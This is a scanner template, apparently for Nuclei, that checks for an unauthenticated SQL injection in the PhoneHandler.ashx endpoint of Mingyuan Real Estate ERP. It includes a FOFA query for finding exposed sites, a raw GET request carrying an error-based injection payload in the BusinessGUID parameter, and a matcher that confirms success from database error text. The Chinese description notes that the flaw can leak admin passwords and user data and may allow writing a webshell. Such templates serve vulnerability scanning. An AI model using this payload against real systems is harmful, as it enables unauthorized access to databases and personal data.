id: MingYuanDiChan-ERP-PhoneHandler_ashx-SQL

info:
  name: 明源地产ERP PhoneHandler.ashx SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: title="明源地产ERP"
    明源地产ERP PhoneHandler.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: |
    -
  tags: SQL Injection

http:
  - raw:
      - |-
        GET /Hkbgl/PhoneWorkflow/Business/PhoneHandler.ashx?type=3&BusinessGUID=a%27+and+@@VERSION>1-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==302 && contains_all(body,'nvarchar','ErrPage.aspx','int')"